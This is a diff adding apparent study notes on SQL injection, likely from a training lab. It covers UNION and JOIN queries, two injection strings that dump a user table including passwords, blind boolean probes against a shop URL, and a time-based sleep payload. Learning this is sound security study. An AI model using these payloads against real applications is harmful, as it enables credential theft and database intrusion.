@@ -1,0 +1,32 @@
+-Combining SQL injection Techniques
+
+Union
+The Union operator is used, to combine the results of two or more SELECT Statements.
+
+Joins
+The Join operator is used to combine rows from two or more tables, based on a related column
+SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
+
+1. '; SELECT * FROM user_system_data WHERE '1'='1'; --
+2. Smith' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --
+
+-Blind SQL injection
+
+when the application does not reflect the information directly on the web page.
+you will need to start asking the database questions based on a true or false statement.
+
+example:
+request: https://my-shop.com?article=4
+SQL query: SELECT * FROM articles WHERE article_id = 4
+
+request: https://my-shop.com?article=4  and 1=1
+SQL query: SELECT * FROM articles WHERE article_id = 4 and 1 = 1
+
+when the results above returns the same page, then this page is vulnerable to bind SQL attacks, else, it will return page not found
+Further, we can ask database for some information like
+ex:
+https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2
+which asks the database version and the type of the database and base on the database type we can do some normal SQL attacks
+
+-time-based SQL injection (when you are totally blind)
+article = 4; sleep(10) --
